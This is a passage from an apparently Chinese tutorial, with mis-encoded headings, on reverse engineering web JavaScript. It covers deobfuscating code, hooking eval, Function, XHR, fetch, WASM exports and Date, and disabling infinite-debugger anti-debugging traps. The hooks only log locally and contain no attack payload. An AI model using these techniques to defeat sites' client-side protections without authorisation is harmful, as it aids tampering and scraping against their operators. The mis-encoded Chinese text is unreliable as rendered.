<span class="kd">const</span><span class="w"> </span><span class="nx">ast</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parser</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>

<span class="c1">// è¿˜åŸå˜é‡å</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Identifier</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;_0x&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;var_&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">().</span><span class="nx">toString</span><span class="p">(</span><span class="mf">36</span><span class="p">).</span><span class="nx">substr</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="mf">9</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generate</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{},</span><span class="w"> </span><span class="nx">code</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">output</span><span class="p">.</span><span class="nx">code</span><span class="p">);</span>
</code></pre>
      </div>

      <h4 id="2-åœ¨çº¿åæ··æ·†å·¥å…·">2. åœ¨çº¿åæ··æ·†å·¥å…·</h4>

      <ul>
        <li><a href="https://deobfuscate.io/">https://deobfuscate.io/</a></li>
        <li><a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a></li>
      </ul>

      <h4 id="3-åŠ¨æ€è°ƒè¯•è¿½è¸ª">3. åŠ¨æ€è°ƒè¯•è¿½è¸ª</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook æ‰€æœ‰å‡½æ•°è°ƒç”¨</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalFunction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">_0x1a2b</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">_0x1a2b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Called with:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalFunction</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Returned:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="p">};</span>
</code></pre>
      </div>

      <h4 id="4-ä½¿ç”¨åæ··æ·†è„šæœ¬">4. ä½¿ç”¨åæ··æ·†è„šæœ¬</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Tampermonkey è„šæœ¬</span>
<span class="c1">// åœ¨é¡µé¢åŠ è½½å‰æ³¨å…¥</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="s1">&#39;use strict&#39;</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Hook eval</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalEval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nb">eval</span><span class="p">;</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nb">eval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;eval code:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">code</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalEval</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// Hook Function æ„é€ å™¨</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">OriginalFunction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nb">Function</span><span class="p">;</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nb">Function</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Function args:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">OriginalFunction</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å¼‚æ­¥ä»£ç è·Ÿè¸ª">å¼‚æ­¥ä»£ç è·Ÿè¸ª</h2>

      <h3 id="é—®é¢˜è¡¨ç°-5">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>Promise/async ä»£ç éš¾ä»¥è°ƒè¯•</li>
        <li>å›è°ƒåœ°ç‹±</li>
        <li>æ‰§è¡Œé¡ºåºæ··ä¹±</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-5">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-async-stack-traces">1. Async Stack Traces</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Chrome DevTools é»˜è®¤å¯ç”¨</span>
<span class="c1">// Settings â†’ Enable async stack traces</span>

<span class="c1">// ç°åœ¨å¯ä»¥çœ‹åˆ°å®Œæ•´çš„å¼‚æ­¥è°ƒç”¨æ ˆ</span>
<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">fetchData</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// å¯ä»¥çœ‹åˆ°å¼‚æ­¥è°ƒç”¨é“¾</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/data&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="2-ä½¿ç”¨-consoletrace">2. ä½¿ç”¨ console.trace</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">complexAsync</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">(</span><span class="s1">&#39;Start&#39;</span><span class="p">);</span><span class="w">  </span><span class="c1">// æ˜¾ç¤ºè°ƒç”¨æ ˆ</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">step1</span><span class="p">();</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">(</span><span class="s1">&#39;After step1&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">step2</span><span class="p">();</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">(</span><span class="s1">&#39;After step2&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="3-æ·»åŠ å¼‚æ­¥æ—¥å¿—">3. æ·»åŠ å¼‚æ­¥æ—¥å¿—</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŒ…è£… fetch</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Fetch started:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">]);</span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Fetch completed:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">status</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Fetch failed:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">error</span><span class="p">);</span>
<span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="nx">error</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="xhrfetch-è¯·æ±‚æ‹¦æˆª">XHR/Fetch è¯·æ±‚æ‹¦æˆª</h2>

      <h3 id="é—®é¢˜è¡¨ç°-6">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>æ— æ³•æ•è· AJAX è¯·æ±‚</li>
        <li>éœ€è¦æŸ¥çœ‹è¯·æ±‚å‚æ•°</li>
        <li>éœ€è¦ä¿®æ”¹è¯·æ±‚</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-6">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-xhr-æ–­ç‚¹">1. XHR æ–­ç‚¹</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// DevTools â†’ Sources â†’ XHR/fetch Breakpoints</span>
<span class="c1">// æ·»åŠ  URL åŒ…å«çš„å…³é”®å­—ï¼Œå¦‚ &quot;/api/&quot;</span>
</code></pre>
      </div>

      <h4 id="2-hook-xmlhttprequest">2. Hook XMLHttpRequest</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">XHR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">XHR</span><span class="p">.</span><span class="nx">open</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">XHR</span><span class="p">.</span><span class="nx">send</span><span class="p">;</span>

<span class="w">    </span><span class="nx">XHR</span><span class="p">.</span><span class="nx">open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">_method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">method</span><span class="p">;</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">url</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">open</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">XHR</span><span class="p">.</span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;XHR Request:&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">_method</span><span class="p">,</span>
<span class="w">            </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">_url</span><span class="p">,</span>
<span class="w">            </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="nx">data</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;load&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;XHR Response:&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">status</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">status</span><span class="p">,</span>
<span class="w">                </span><span class="nx">response</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span>
<span class="w">            </span><span class="p">});</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">send</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h4 id="3-hook-fetch">3. Hook Fetch</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>

<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Fetch Request:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Clone å“åº”ä»¥é¿å…æ¶ˆè´¹</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">clonedResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">();</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">clonedResponse</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>

<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Fetch Response:&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">status</span><span class="o">:</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">status</span><span class="p">,</span>
<span class="w">            </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="webassembly-è°ƒè¯•">WebAssembly è°ƒè¯•</h2>

      <h3 id="é—®é¢˜è¡¨ç°-7">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>WASM ä»£ç éš¾ä»¥ç†è§£</li>
        <li>æ— æ³•è®¾ç½®æ–­ç‚¹</li>
        <li>å˜é‡æŸ¥çœ‹å›°éš¾</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-7">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-ä½¿ç”¨-wasm-debug-info">1. ä½¿ç”¨ WASM Debug Info</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å¦‚æœ WASM åŒ…å«è°ƒè¯•ä¿¡æ¯</span>
<span class="c1">// Chrome DevTools å¯ä»¥æ˜¾ç¤ºæºç </span>

<span class="c1">// æŸ¥çœ‹ WASM æ¨¡å—</span>
<span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">instantiate</span><span class="p">(</span><span class="nx">bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">imports</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">result</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">);</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h4 id="2-ä½¿ç”¨-wasmtimewasmer-è°ƒè¯•">2. ä½¿ç”¨ wasmtime/wasmer è°ƒè¯•</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨ wasmtime è¿è¡Œå¹¶è°ƒè¯•</span>
wasmtime<span class="w"> </span>--invoke<span class="w"> </span>main<span class="w"> </span>module.wasm

<span class="c1"># ä½¿ç”¨ wasmer</span>
wasmer<span class="w"> </span>run<span class="w"> </span>module.wasm
</code></pre>
      </div>

      <h4 id="3-hook-wasm-å‡½æ•°">3. Hook WASM å‡½æ•°</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// è·å– WASM å®ä¾‹</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">instance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">wasmInstance</span><span class="p">;</span>

<span class="c1">// Hook å¯¼å‡ºå‡½æ•°</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalFunc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">;</span>
<span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;WASM encrypt called:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalFunc</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;WASM encrypt result:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ—¶é—´ç›¸å…³é—®é¢˜">æ—¶é—´ç›¸å…³é—®é¢˜</h2>

      <h3 id="é—®é¢˜è¡¨ç°-8">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>æ—¶é—´æˆ³æ£€æµ‹</li>
        <li>è¶…æ—¶å¤±æ•ˆ</li>
        <li>å®šæ—¶å™¨é—®é¢˜</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-8">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-hook-date">1. Hook Date</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å›ºå®šæ—¶é—´</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">fixedTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">(</span><span class="s1">&#39;2024-01-01 00:00:00&#39;</span><span class="p">).</span><span class="nx">getTime</span><span class="p">();</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">OriginalDate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nb">Date</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">OriginalDate</span><span class="p">(</span><span class="nx">fixedTime</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">OriginalDate</span><span class="p">(...</span><span class="nx">args</span><span class="p">);</span>
<span class="p">};</span>
<span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">fixedTime</span><span class="p">;</span>
<span class="p">};</span>
<span class="nb">Date</span><span class="p">.</span><span class="nx">prototype</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">OriginalDate</span><span class="p">.</span><span class="nx">prototype</span><span class="p">;</span>
</code></pre>
      </div>

      <h4 id="2-hook-settimeoutsetinterval">2. Hook setTimeout/setInterval</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">originalSetTimeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">setTimeout</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">setTimeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">callback</span><span class="p">,</span><span class="w"> </span><span class="nx">delay</span><span class="p">,</span><span class="w"> </span><span class="p">...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`setTimeout called: </span><span class="si">${</span><span class="nx">delay</span><span class="si">}</span><span class="sb">ms`</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalSetTimeout</span><span class="p">(</span><span class="nx">callback</span><span class="p">,</span><span class="w"> </span><span class="nx">delay</span><span class="p">,</span><span class="w"> </span><span class="p">...</span><span class="nx">args</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ— é™-debugger">æ— é™ debugger</h2>

      <h3 id="é—®é¢˜è¡¨ç°-9">é—®é¢˜è¡¨ç°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åè°ƒè¯•ä»£ç </span>
<span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span>
<span class="p">},</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="è§£å†³æ–¹æ¡ˆ-9">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-ç¦ç”¨æ–­ç‚¹">1. ç¦ç”¨æ–­ç‚¹</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Chrome DevTools:</span>
<span class="c1">// ç‚¹å‡» &quot;Deactivate breakpoints&quot; æŒ‰é’® (Ctrl + F8)</span>
</code></pre>
      </div>

      <h4 id="2-æ¡ä»¶æ–­ç‚¹ç»•è¿‡">2. æ¡ä»¶æ–­ç‚¹ç»•è¿‡</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ debugger è¯­å¥ä¸Šå³é”® â†’ &quot;Never pause here&quot;</span>

<span class="c1">// æˆ–æ·»åŠ æ¡ä»¶æ–­ç‚¹</span>
<span class="kc">false</span><span class="w">  </span><span class="c1">// æ°¸è¿œä¸æš‚åœ</span>
</code></pre>
      </div>

      <h4 id="3-æ›¿æ¢-debugger">3. æ›¿æ¢ debugger</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä½¿ç”¨ Overrides æˆ– Requestly</span>
<span class="c1">// å°†ä»£ç ä¸­çš„ debugger æ›¿æ¢ä¸ºç©ºè¯­å¥</span>

<span class="c1">// æˆ– Hook Function</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">_constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Function</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="kr">constructor</span><span class="p">;</span>
<span class="nb">Function</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="kr">constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="sr">/debugger/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{};</span>
<span class="w">    </span><span class="p">}</span>
